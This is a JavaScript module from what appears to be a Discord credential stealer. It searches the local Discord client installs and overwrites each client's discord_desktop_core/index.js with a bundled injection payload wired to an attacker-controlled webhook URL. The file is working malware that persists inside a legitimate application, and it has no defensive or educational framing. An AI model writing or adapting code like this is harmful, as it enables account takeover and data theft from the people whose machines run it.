const { existsSync, lstatSync, readdirSync, writeFileSync, readFileSync } = require('fs');
const { join } = require('path');
const { paths: { localAppData } } = require('../util/variables');
const { webhook } = require('../config');

const injectionPath = join(__dirname, '..', 'assets', 'injection.js');
if (!existsSync(injectionPath)) return;

['Discord', 'DiscordCanary', 'DiscordPTB', 'DiscordDevelopment'].forEach(dir => {
  const path = join(localAppData, dir);
  if (!existsSync(path) || !lstatSync(path).isDirectory()) return;
  let finalPath = join(path, readdirSync(path).find(f => f.startsWith('app-')));
  finalPath = join(finalPath, readdirSync(finalPath).find(f => f === 'modules'));
  finalPath = join(finalPath, readdirSync(finalPath).find(f => f.startsWith('discord_desktop_core')));
  finalPath = join(finalPath, readdirSync(finalPath).find(f => f === 'discord_desktop_core'));
  if (!existsSync(finalPath) || !lstatSync(finalPath).isDirectory()) return;
  writeFileSync(join(finalPath, 'index.js'), readFileSync(injectionPath).toString().replace('\'%WEBHOOK_URL%\'', `'${webhook.url}'`));
});
